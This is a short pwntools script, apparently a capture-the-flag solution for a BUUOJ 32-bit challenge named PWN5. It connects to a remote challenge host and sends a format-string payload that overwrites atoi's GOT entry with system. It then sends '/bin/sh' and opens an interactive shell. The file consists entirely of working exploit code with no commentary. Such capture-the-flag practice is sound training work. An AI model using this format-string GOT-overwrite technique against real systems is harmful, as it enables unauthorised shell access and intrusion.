from pwn import *


def pwn5(file_name=r'/mnt/hgfs/CyberSecurity/PWN/buuoj/[第五空间2019 决赛]PWN5'):
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 28490)
    target_elf = ELF(file_name)

    atoi_got = p32(target_elf.got['atoi'])
    system_elf = p32(target_elf.plt['system'])

    payload = fmtstr_payload(10, {u32(atoi_got): u32(system_elf)})
    print(len(payload))

    target.sendline(payload)
    target.sendline(b'/bin/sh')

    target.interactive()


if __name__ == '__main__':
    pwn5()
